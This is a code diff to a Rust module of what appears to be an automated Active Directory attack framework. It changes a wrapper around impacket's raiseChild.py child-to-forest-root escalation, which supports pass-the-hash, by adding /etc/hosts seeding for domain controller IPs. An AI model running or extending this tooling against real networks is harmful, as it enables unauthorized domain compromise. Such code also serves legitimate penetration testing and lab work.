@@ -199,21 +199,35 @@ pub async fn krbrelayup(args: &Value) -> Result<ToolOutput> {
 ///
 /// Required args: `child_domain`, `username`
 /// Auth: `password` (plaintext) OR `hash` (NTLM pass-the-hash). At least one required.
+/// Optional args: `child_dc_ip`, `parent_domain`, `parent_dc_ip` — when supplied,
+/// these are written to `/etc/hosts` so the impacket script can resolve domain
+/// FQDNs without forest DNS access. raiseChild itself only takes the positional
+/// `domain/user[:pass]` + auth flags; the IP args are NOT forwarded to it.
 ///
 /// raiseChild auto-discovers the parent forest root via the child DC's
 /// trustedDomain LDAP objects, so callers don't need to supply parent FQDN
-/// or DC IPs. The script accepts only the positional `domain/user[:pass]`
-/// plus `-hashes`, `-w`, `-target-exec`, `-targetRID`, `-k`, `-aesKey`,
-/// `-no-pass`. Passing `-dc-ip` / `-target-ip` / `-target-domain` makes
-/// argparse exit 2.
+/// or DC IPs to the script. But raiseChild *does* call `gethostbyname()` /
+/// SMB-binds against the bare domain name (e.g. `north.sevenkingdoms.local`),
+/// not the DC FQDN — so on a worker without forest DNS this fails with
+/// `Name or service not known`. Pre-seeding `/etc/hosts` fixes that.
 pub async fn raise_child(args: &Value) -> Result<ToolOutput> {
     let child_domain = required_str(args, "child_domain")?;
     let username = required_str(args, "username")?;
     let password = optional_str(args, "password");
     let hash = optional_str(args, "hash");
+    let child_dc_ip = optional_str(args, "child_dc_ip").filter(|s| !s.is_empty());
+    let parent_domain = optional_str(args, "parent_domain").filter(|s| !s.is_empty());
+    let parent_dc_ip = optional_str(args, "parent_dc_ip").filter(|s| !s.is_empty());
 
     if password.is_none() && hash.is_none() {
         anyhow::bail!("raise_child requires either 'password' or 'hash' for authentication");
+    }
+
+    if let Some(ip) = child_dc_ip {
+        crate::privesc::trust::ensure_hosts_entry(ip, child_domain)?;
+    }
+    if let (Some(pd), Some(pip)) = (parent_domain, parent_dc_ip) {
+        crate::privesc::trust::ensure_hosts_entry(pip, pd)?;
     }
 
     let mut cmd = CommandBuilder::new("raiseChild.py");
